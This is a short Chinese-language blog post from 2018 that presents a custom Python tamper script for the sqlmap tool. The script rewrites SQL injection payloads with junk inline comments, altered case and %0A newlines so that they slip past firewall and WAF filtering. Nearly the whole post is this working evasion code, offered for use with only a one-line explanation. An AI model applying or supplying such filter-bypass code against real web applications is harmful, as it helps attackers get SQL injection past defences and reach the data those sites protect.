---
layout: post
title:  "Sqlmap tamper 总结"
date:   2018-01-05
categories: 工具
permalink: /archivers/2018-01-05/1
description: "总结一下tamper"
---
总结一下tamper
<!--more-->

## 0x00 绕过防火墙

防火墙的规则肯定是没有WAF更新的那么快，所以要写一个比较实用的、容易变通的tamper：

```python
#!/usr/bin/env python

import re
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    if payload:
        payload = payload.replace("CONCAT(", "CONCAT_WS(MID(CHAR(0),0,0),")
        payload = payload.replace("AND","/* (;.../+___io1d_6^1``)*/AND")
        payload = payload.replace("SLEEP","sLEep")
        payload = payload.replace("ASCII(", "ASCII/*i({].,$$!~!<)*/(")
        payload = payload.replace("VARCHAR(", "VARCHAR/**/(")
        payload = payload.replace("CHR(", "CHR/*io%!`;/.,-=+/2*/(")
        payload = payload.replace("(SELECT", "/*`^~`\Ddhsjnnw_+ddsws//-  */( SELECT")
        payload = payload.replace("UNION", "/*PPdd{[;!`(_.,>?l}*/ UNION%0A")
        payload = payload.replace("ORDER", "ORDER%0A")
        payload = payload.replace("EXISTS", "EXISTS%0A")
        payload = payload.replace("LIMIT", "LIMIT%0A")
        #payload = payload.replace("SLEEP(5)","\"0\" LikE Sleep(5)")
        #payload = payload.replace(" ","/*FFFFFFFFFFFFFFFFFFFFFFFFF*/")
        #payload = payload.replace("--","-- x")
        #p = re.compile(r'(\d+)=')
        #payload = p.sub(r"'\1'LikE ", payload)
    return payload
```

